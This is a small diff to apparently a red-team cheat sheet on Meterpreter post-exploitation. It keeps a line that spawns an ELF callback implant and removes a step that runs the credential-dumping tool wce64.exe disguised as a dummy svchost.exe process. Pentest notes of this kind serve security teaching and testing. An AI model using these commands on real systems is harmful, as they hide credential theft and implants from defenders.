@@ -40,12 +40,6 @@ Spawn ELF Callback Implant.
 meterpreter > execute -Hicf ./implant
 ```
 
-Spawn a executable program as a dummy process with `-d` flag.
-
-```
-meterpreter > execute -Hicmd svchost.exe -f /usr/share/windows-resources/wce/wce64.exe -a "-h"
-```
-
 ---
 ## References
 
